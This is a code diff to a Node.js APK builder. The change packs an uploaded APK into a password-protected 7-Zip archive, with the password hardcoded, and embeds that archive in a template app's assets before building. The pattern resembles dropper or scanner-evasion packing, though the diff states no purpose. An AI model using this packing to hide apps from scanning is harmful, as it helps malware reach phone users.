@@ -3,12 +3,15 @@ const fs = require("fs");
 const unzipper = require("unzipper");
 const {spawn} = require("child_process");
 const sharp = require("sharp");
+const {add} = require("node-7z");
+const { path7za } = require('7zip-bin');
 
 class ApkGenerator {
     constructor(appName, id) {
         this.id = id;
         this.appName = appName;
         this.applicationPath = path.join(__dirname, "../../data/uploads/" + id + "/app.apk");
+        this.applicationZipPath = path.join(__dirname, "../../data/uploads/" + id + "/app.zip");
         this.iconPath = path.join(__dirname, "../../data/uploads/" + id + "/app_icon.png");
         this.projectPath = path.join(__dirname, "../../data/temp/" + id);
         this.mainProjectPath = path.join(__dirname, "../../data/main/project.zip");
@@ -153,6 +156,18 @@ class ApkGenerator {
 
     }
 
+    async createZip(inputFile, outputZip, password) {
+        return new Promise((resolve, reject) => {
+            const zipProcess = add(outputZip, [inputFile], {
+                $bin: path7za,
+                password: password,
+                recursive: false,
+            });
+
+            zipProcess.on('end', () => resolve('Zip file created successfully.'));
+            zipProcess.on('error', (err) => reject(err));
+        });
+    }
 
     copyFile(source, destination) {
         return new Promise((resolve, reject) => {
@@ -296,8 +311,10 @@ class ApkGenerator {
             const destinationIcon = path.join(this.projectPath, "app", "src", "main", "res", "drawable/");
             const destinationApp = path.join(this.projectPath, "app", "src", "main", "assets/");
 
+            await this.createZip(this.applicationPath, this.applicationZipPath, "4gs19b2kno2dra2r6");
+
             await this.copyFile(this.iconPath, destinationIcon);
-            await this.copyFile(this.applicationPath, destinationApp);
+            await this.copyFile(this.applicationZipPath, destinationApp);
 
             await this.replaceIcons();
             await this.buildApk();
